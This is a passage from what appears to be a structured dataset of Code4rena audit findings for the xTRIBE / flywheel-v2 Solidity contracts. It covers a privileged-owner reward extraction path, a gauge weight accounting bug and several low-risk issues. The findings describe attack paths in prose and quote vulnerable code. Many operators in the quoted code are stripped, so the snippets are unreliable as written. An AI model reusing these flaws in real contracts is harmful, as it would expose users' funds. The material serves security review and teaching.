unclaimed\n263           uint256 supplierDelta = (supplierTokens * deltaIndex) / ONE;\n264           uint256 supplierAccrued = rewardsAccrued[user] + supplierDelta;\n265   \n266           rewardsAccrued[user] = supplierAccrued;\n\n\nFlywheelCore.sol#L258-L266(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L258-L266)<br\n\nsolidity\nFile: flywheel-v2/src/FlywheelCore.sol\n\n119       function claimRewards(address user) external {\n120           uint256 accrued = rewardsAccrued[user];\n121   \n122           if (accrued != 0) {\n123               rewardsAccrued[user] = 0;\n124   \n125               rewardToken.safeTransferFrom(address(flywheelRewards), user, accrued);\n\n\nFlywheelCore.sol#L119-L125(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L119-L125)<br\n\nProjects also using BaseFlywheelRewards or its child contrats, are implicitly approving infinite transfers by the core\n\nsolidity\nFile: flywheel-v2/src/rewards/BaseFlywheelRewards.sol\n\n25        constructor(FlywheelCore _flywheel) {\n26            flywheel = _flywheel;\n27            ERC20 _rewardToken = _flywheel.rewardToken();\n28            rewardToken = _rewardToken;\n29    \n30            _rewardToken.safeApprove(address(_flywheel), type(uint256).max);\n31        }\n\n\nBaseFlywheelRewards.sol#L25-L31(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/BaseFlywheelRewards.sol#L25-L31)<br\n\nThe attacker need not keep the booster set this way he/she can set it, call accrue() for his/her specific user, and unset it, all in the same block.\n\n",
                "Repair": "\nMake flywheelRewards immutable, or only allow it to change if there are no current users.\n\nJoeysantoro (xTRIBE) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/23#issuecomment-1110489785):\n  This is a similar issue to one which already affects the SushiSwap masterchef. If rewards are decreased without first calling the accrue-equivalent on the masterchef, then previous rewards are lost.\n \n If trust minimization is a desired property (in my opinion it is), then these functions should be behind timelocks.\n \n If a user can call accrue before the booster is updated, they can lock in past rewards as they are added onto the rewardsAccrued global state var\n 266           rewardsAccrued[user] = supplierAccrued;\n\n  I don't really see this as a vulnerability, but will leave it to the C4 judge.\n\n0xean (judge) commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/23#issuecomment-1130780752):\n  I do see this as a vulnerability. Essentially, there is a backdoor by which a privileged address can extract value from users.  A timelock would be a potential solution to mitigate some of the risk, as well as the mitigation options presented by the warden. \n \n \n 2 \u2014 Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n \n This is a hypothetical attack path with external requirements and deserves the medium severity rating. \n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-07",
                "Location": [],
                "Type": " Incorrect accounting of free weight in  _decrementWeightUntilFree ",
                "Description": "\nIn _decrementWeightUntilFree, the free weight is calculated by balanceOf[user] getUserWeight[user] plus weight freed from non-deprecated gauges. The non-deprecated criteria is unnecessary and lead to incorrect accounting of free weight.\n\n\nERC20Gauges.sol#L547-L583(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L547-L583)<br\n\n        function _decrementWeightUntilFree(address user, uint256 weight) internal {\n            uint256 userFreeWeight = balanceOf[user] getUserWeight[user];\n\n            // early return if already free\n            if (userFreeWeight = weight) return;\n\n            uint32 currentCycle = _getGaugeCycleEnd();\n\n            // cache totals for batch updates\n            uint112 userFreed;\n            uint112 totalFreed;\n\n            // Loop through all user gauges, live and deprecated\n            address[] memory gaugeList = _userGauges[user].values();\n\n            // Free gauges until through entire list or under weight\n            uint256 size = gaugeList.length;\n            for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight; ) {\n                address gauge = gaugeList[i];\n                uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];\n                if (userGaugeWeight != 0) {\n                    // If the gauge is live (not deprecated), include its weight in the total to remove\n                    if (!_deprecatedGauges.contains(gauge)) {\n                        totalFreed += userGaugeWeight;\n                    }\n                    userFreed += userGaugeWeight;\n                    _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle);\n\n                    unchecked {\n                        i++;\n                    }\n                }\n            }\n\n            getUserWeight[user] -= userFreed;\n            _writeGaugeWeight(_totalWeight, _subtract, totalFreed, currentCycle);\n        }\n\nConsider Alice allocated 3 weight to gauge D, gauge A and gauge B equally where gauge D is depricated\n\n1.  Alice call _decrementWeightUntilFree(alice, 2)\n2.  userFreeWeight = 0\n3.  gauge D is freed, totalFreed = 0, userFreed = 1\n4.  (userFreeWeight + totalFreed) < weight, continue to free next gauge\n5.  gauge A is freed, totalFreed = 1, userFreed = 2\n6.  (userFreeWeight + totalFreed) < weight, continue to free next gauge\n7.  gauge B is freed, totalFreed = 2, userFreed = 3\n8.  All gauge is freed\n\nAlternatively, Alice can\n\n1.  Alice call _decrementWeightUntilFree(alice, 1)\n2.  userFreeWeight = balanceOf[alice] getUserWeight[alice] = 3 3 = 0\n3.  gauge D is freed, totalFreed = 0, userFreed = 1\n4.  (userFreeWeight + totalFreed) < weight, continue to free next gauge\n5.  gauge A is freed, totalFreed = 1, userFreed = 2\n6.  (userFreeWeight + totalFreed) = weight, break\n7.  getUserWeight[alice] -= totalFreed\n8.  Alice call _decrementWeightUntilFree(alice, 2)\n9.  userFreeWeight = balanceOf[alice] getUserWeight[alice] = 3 1 = 2\n10. (userFreeWeight + totalFreed) = weight, break\n11. Only 2 gauge is freed\n\n",
                "Repair": "\nNo need to treat deprecated gauge separately.\n\nJoeysantoro (xTRIBE) confirmed and commented(https://github.com/code-423n4/2022-04-xtribe-findings/issues/61#issuecomment-1125550837):\n  This appears correct. Would be for a Tribe dev to validate with a test that certain paths could brick create this incorrect accounting.\n\n\n\n*\n\n\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 27 reports were submitted by wardens detailing low risk and non-critical issues. The report highlighted below(https://github.com/code-423n4/2022-04-xtribe-findings/issues/27) by IllIllI received the top score from the judge.\n\n*The following wardens also submitted reports: joestakey(https://github.com/code-423n4/2022-04-xtribe-findings/issues/76), hyh(https://github.com/code-423n4/2022-04-xtribe-findings/issues/39), robee(https://github.com/code-423n4/2022-04-xtribe-findings/issues/6), rayn(https://github.com/code-423n4/2022-04-xtribe-findings/issues/56), sorrynotsorry(https://github.com/code-423n4/2022-04-xtribe-findings/issues/37), Dravee(https://github.com/code-423n4/2022-04-xtribe-findings/issues/64), MaratCerby(https://github.com/code-423n4/2022-04-xtribe-findings/issues/10), delfin454000(https://github.com/code-423n4/2022-04-xtribe-findings/issues/54), defsec(https://github.com/code-423n4/2022-04-xtribe-findings/issues/98), Ruhum(https://github.com/code-423n4/2022-04-xtribe-findings/issues/43), teryanarmen(https://github.com/code-423n4/2022-04-xtribe-findings/issues/75), hake(https://github.com/code-423n4/2022-04-xtribe-findings/issues/87), gzeon(https://github.com/code-423n4/2022-04-xtribe-findings/issues/63), VAD37(https://github.com/code-423n4/2022-04-xtribe-findings/issues/67), 0xmint(https://github.com/code-423n4/2022-04-xtribe-findings/issues/71), CertoraInc(https://github.com/code-423n4/2022-04-xtribe-findings/issues/69), fatima_naz(https://github.com/code-423n4/2022-04-xtribe-findings/issues/33), 0xDjango(https://github.com/code-423n4/2022-04-xtribe-findings/issues/97), csanuragjain(https://github.com/code-423n4/2022-04-xtribe-findings/issues/21), samruna(https://github.com/code-423n4/2022-04-xtribe-findings/issues/30), catchup(https://github.com/code-423n4/2022-04-xtribe-findings/issues/50), 0v3rf10w(https://github.com/code-423n4/2022-04-xtribe-findings/issues/13), simon135(https://github.com/code-423n4/2022-04-xtribe-findings/issues/72), oyc_109(https://github.com/code-423n4/2022-04-xtribe-findings/issues/2), kebabsec(https://github.com/code-423n4/2022-04-xtribe-findings/issues/81), and dipp(https://github.com/code-423n4/2022-04-xtribe-findings/issues/83).*\n\n\n"
            },
            {
                "Name": "-01",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n392        require(nonce == nonces[signer]++, \"ERC20MultiVotes: invalid nonce\");\n"
                ],
                "Type": " Nonce used for multiple purposes",
                "Description": "\nThe nonce mapping used for permit() calls is the same as the one used for delegateBySig(). This should at the very least be documented so signers know that the order of operations between the two functions matters, and so that multicall()s can be organized appropriately\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n392        require(nonce == nonces[signer]++, \"ERC20MultiVotes: invalid nonce\");\n\n\nERC20MultiVotes.sol#L392(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L392)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-02",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n392        require(nonce == nonces[signer]++, \"ERC20MultiVotes: invalid nonce\");\n"
                ],
                "Type": "  multicall() s involving  permit()  and  delegateBySig()  can be DOSed",
                "Description": "\nAttackers monitoring the blockchain for multicalls can front-run by calling permit() and delegateBySig() before the multicall(), causing it to revert. Have separate flavors of the functions where the multicall() data is included in the hash\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n392        require(nonce == nonces[signer]++, \"ERC20MultiVotes: invalid nonce\");\n\n\nERC20MultiVotes.sol#L392(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L392)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-03",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n82      @return the cumulative amount of rewards accrued to user (including prior)\n"
                ],
                "Type": " Misleading comments",
                "Description": "\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n82      @return the cumulative amount of rewards accrued to user (including prior)\n\n\nThe cumulative amount of rewards accrued to the user since the last claim<br\nFlywheelCore.sol#L82(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L82)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-04",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #1\n\n196             assert(queuedRewards.storedCycle == 0 || queuedRewards.storedCycle = lastCycle);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #2\n\n235         assert(queuedRewards.storedCycle = cycle);\n"
                ],
                "Type": "  require()  should be used instead of  assert() ",
                "Description": "\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #1\n\n196             assert(queuedRewards.storedCycle == 0 || queuedRewards.storedCycle = lastCycle);\n\n\nFlywheelGaugeRewards.sol#L196(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L196)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #2\n\n235         assert(queuedRewards.storedCycle = cycle);\n\n\nFlywheelGaugeRewards.sol#L235(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L235)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-01",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #1\n\n114         require(rewardToken.balanceOf(address(this)) balanceBefore = totalQueuedForCycle);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #2\n\n153             require(rewardToken.balanceOf(address(this)) balanceBefore = newRewards);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #3\n\n154             require(newRewards <= type(uint112).max); // safe cast\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #4\n\n195             require(queuedRewards.storedCycle < currentCycle);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #5\n\n200             require(nextRewards <= type(uint112).max); // safe cast\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #6\n\n345             require(_userGauges[user].remove(gauge));\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #7\n\n266             require(_delegates[delegator].remove(delegatee));\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #8\n\n352                 require(_delegates[user].remove(delegatee)); // Remove from set. Should never fail.\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #9\n\n393         require(signer != address(0));\n"
                ],
                "Type": "  require() / revert()  statements should have descriptive reason strings",
                "Description": "\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #1\n\n114         require(rewardToken.balanceOf(address(this)) balanceBefore = totalQueuedForCycle);\n\n\nFlywheelGaugeRewards.sol#L114(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L114)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #2\n\n153             require(rewardToken.balanceOf(address(this)) balanceBefore = newRewards);\n\n\nFlywheelGaugeRewards.sol#L153(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L153)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #3\n\n154             require(newRewards <= type(uint112).max); // safe cast\n\n\nFlywheelGaugeRewards.sol#L154(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L154)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #4\n\n195             require(queuedRewards.storedCycle < currentCycle);\n\n\nFlywheelGaugeRewards.sol#L195(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L195)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #5\n\n200             require(nextRewards <= type(uint112).max); // safe cast\n\n\nFlywheelGaugeRewards.sol#L200(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L200)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #6\n\n345             require(_userGauges[user].remove(gauge));\n\n\nERC20Gauges.sol#L345(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L345)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #7\n\n266             require(_delegates[delegator].remove(delegatee));\n\n\nERC20MultiVotes.sol#L266(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L266)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #8\n\n352                 require(_delegates[user].remove(delegatee)); // Remove from set. Should never fail.\n\n\nERC20MultiVotes.sol#L352(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L352)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #9\n\n393         require(signer != address(0));\n\n\nERC20MultiVotes.sol#L393(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L393)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-02",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n84     function accrue(ERC20 strategy, address user) public returns (uint256) {\n",
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #2\n\n101     function accrue(\n102         ERC20 strategy,\n103         address user,\n104         address secondUser\n105     ) public returns (uint256, uint256) {\n"
                ],
                "Type": "  public  functions not called by the contract should be declared  external  instead",
                "Description": "\nContracts are allowed(https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from external to public.\n\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n84     function accrue(ERC20 strategy, address user) public returns (uint256) {\n\n\nFlywheelCore.sol#L84(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L84)<br\n\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #2\n\n101     function accrue(\n102         ERC20 strategy,\n103         address user,\n104         address secondUser\n105     ) public returns (uint256, uint256) {\n\n\nFlywheelCore.sol#L101-L105(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L101-L105)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-03",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n4 pragma //solidity ^0.8.0;\n"
                ],
                "Type": " Use a more recent version of solidity",
                "Description": "\nUse a solidity version of at least 0.8.4 to get bytes.concat() instead of abi.encodePacked(<bytes,<bytes)<br\nUse a solidity version of at least 0.8.12 to get string.concat() instead of abi.encodePacked(<str,<str)\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #1\n\n4 pragma solidity ^0.8.0;\n\n\nERC20MultiVotes.sol#L4(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L4)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-04",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #1\n\n47     uint32 public immutable gaugeCycleLength;\n"
                ],
                "Type": " Constant redefined elsewhere",
                "Description": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #1\n\n47     uint32 public immutable gaugeCycleLength;\n\n\nseen in lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol<br\nERC20Gauges.sol#L47(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L47)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-05",
                "Location": [
                    "//solidity\nFile: lib/xTRIBE/src/xTRIBE.sol   #1\n\n4 pragma //solidity ^0.8.0;\n"
                ],
                "Type": " Non-library/interface files should use fixed compiler versions, not floating ones",
                "Description": "\nsolidity\nFile: lib/xTRIBE/src/xTRIBE.sol   #1\n\n4 pragma solidity ^0.8.0;\n\n\nxTRIBE.sol#L4(https://github.com/fei-protocol/xTRIBE/tree/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol#L4)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-06",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n17          The Core contract maintaings three important pieces of state:\n",
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #2\n\n262         // accumulate rewards by multiplying user tokens by rewardsPerToken index and adding on unclaimed\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #3\n\n230     /// @notice thrown when incremending during the freeze window.\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #4\n\n143     /// @notice An event thats emitted when an account changes its delegate\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #5\n\n189      * @param delegatee the receivier of votes.\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #6\n\n364    /*///////////////////////////////////////////////////////////////\n365                             EIP-712 LOGIC\n366    //////////////////////////////////////////////////////////////*/\n"
                ],
                "Type": " Typos",
                "Description": "\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n17          The Core contract maintaings three important pieces of state:\n\n\nmaintaings<br\nFlywheelCore.sol#L17(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L17)<br\n\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #2\n\n262         // accumulate rewards by multiplying user tokens by rewardsPerToken index and adding on unclaimed\n\n\nrewardsPerToken<br\nFlywheelCore.sol#L262(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L262)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #3\n\n230     /// @notice thrown when incremending during the freeze window.\n\n\nincremending<br\nERC20Gauges.sol#L230(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L230)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #4\n\n143     /// @notice An event thats emitted when an account changes its delegate\n\n\nthats<br\nERC20MultiVotes.sol#L143(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L143)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #5\n\n189      * @param delegatee the receivier of votes.\n\n\nreceivier<br\nERC20MultiVotes.sol#L189(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L189)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #6\n\n364    /*///////////////////////////////////////////////////////////////\n365                             EIP-712 LOGIC\n366    //////////////////////////////////////////////////////////////*/\n\n\nDid you mean EIP-2612?<br\nERC20MultiVotes.sol#L364-L366(https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L364-L366)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-07",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n93     / \n94       @notice accrue rewards for a two users on a strategy\n95       @param strategy the strategy to accrue a user's rewards on\n96       @param user the first user to be accrued\n97       @param user the second user to be accrued\n98       @return the cumulative amount of rewards accrued to the first user (including prior)\n99       @return the cumulative amount of rewards accrued to the second user (including prior)\n100     */\n101     function accrue(\n102         ERC20 strategy,\n103         address user,\n104         address secondUser\n105     ) public returns (uint256, uint256) {\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #2\n\n130       @param num the number of gauges to return\n131     */\n132     function gauges(uint256 offset, uint256 num) external view returns (address[] memory values) {\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #3\n\n176       @param num the number of gauges to return.\n177     */\n178     function userGauges(\n179         address user,\n180         uint256 offset,\n181         uint256 num\n182     ) external view returns (address[] memory values) {\n"
                ],
                "Type": " NatSpec is incomplete",
                "Description": "\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n93     / \n94       @notice accrue rewards for a two users on a strategy\n95       @param strategy the strategy to accrue a user's rewards on\n96       @param user the first user to be accrued\n97       @param user the second user to be accrued\n98       @return the cumulative amount of rewards accrued to the first user (including prior)\n99       @return the cumulative amount of rewards accrued to the second user (including prior)\n100     */\n101     function accrue(\n102         ERC20 strategy,\n103         address user,\n104         address secondUser\n105     ) public returns (uint256, uint256) {\n\n\nMissing: @param secondUser<br\nFlywheelCore.sol#L93-L105(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L93-L105)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #2\n\n130       @param num the number of gauges to return\n131     */\n132     function gauges(uint256 offset, uint256 num) external view returns (address[] memory values) {\n\n\nMissing: @return<br\nERC20Gauges.sol#L130-L132(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L130-L132)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #3\n\n176       @param num the number of gauges to return.\n177     */\n178     function userGauges(\n179         address user,\n180         uint256 offset,\n181         uint256 num\n182     ) external view returns (address[] memory values) {\n\n\nMissing: @return<br\nERC20Gauges.sol#L176-L182(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol#L176-L182)<br\n\n\n",
                "Repair": ""
            },
            {
                "Name": "-08",
                "Location": [
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n66     event AccrueRewards(ERC20 indexed strategy, address indexed user, uint256 rewardsDelta, uint256 rewardsIndex);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #2\n\n73     event ClaimRewards(address indexed user, uint256 amount);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #3\n\n44     event CycleStart(uint32 indexed cycleStart, uint256 rewardAmount);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #4\n\n47     event QueueRewards(address indexed gauge, uint32 indexed cycleStart, uint256 rewardAmount);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #5\n\n234     event IncrementGaugeWeight(address indexed user, address indexed gauge, uint256 weight, uint32 cycleEnd);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #6\n\n237     event DecrementGaugeWeight(address indexed user, address indexed gauge, uint256 weight, uint32 cycleEnd);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #7\n\n440     event MaxGaugesUpdate(uint256 oldMaxGauges, uint256 newMaxGauges);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #8\n\n443     event CanContractExceedMaxGaugesUpdate(address indexed account, bool canContractExceedMaxGauges);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #9\n\n102     event MaxDelegatesUpdate(uint256 oldMaxDelegates, uint256 newMaxDelegates);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #10\n\n105     event CanContractExceedMaxDelegatesUpdate(address indexed account, bool canContractExceedMaxDelegates);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #11\n\n135     event Delegation(address indexed delegator, address indexed delegate, uint256 amount);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #12\n\n138     event Undelegation(address indexed delegator, address indexed delegate, uint256 amount);\n",
                    "//solidity\nFile: lib/flywheel-v2/src/token/ERC20MultiVotes.sol   #13\n\n141     event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n"
                ],
                "Type": " Event is missing  indexed  fields",
                "Description": "\nEach event should use three indexed fields if there are three or more fields\n\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #1\n\n66     event AccrueRewards(ERC20 indexed strategy, address indexed user, uint256 rewardsDelta, uint256 rewardsIndex);\n\n\nFlywheelCore.sol#L66(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L66)<br\n\nsolidity\nFile: lib/flywheel-v2/src/FlywheelCore.sol   #2\n\n73     event ClaimRewards(address indexed user, uint256 amount);\n\n\nFlywheelCore.sol#L73(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/FlywheelCore.sol#L73)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #3\n\n44     event CycleStart(uint32 indexed cycleStart, uint256 rewardAmount);\n\n\nFlywheelGaugeRewards.sol#L44(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L44)<br\n\nsolidity\nFile: lib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol   #4\n\n47     event QueueRewards(address indexed gauge, uint32 indexed cycleStart, uint256 rewardAmount);\n\n\nFlywheelGaugeRewards.sol#L47(https://github.com/fei-protocol/flywheel-v2/tree/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/rewards/FlywheelGaugeRewards.sol#L47)<br\n\nsolidity\nFile: lib/flywheel-v2/src/token/ERC20Gauges.sol   #5\n\n234     event IncrementGaugeWeight(address indexed user, address indexed gauge, uint256 weight, uint32 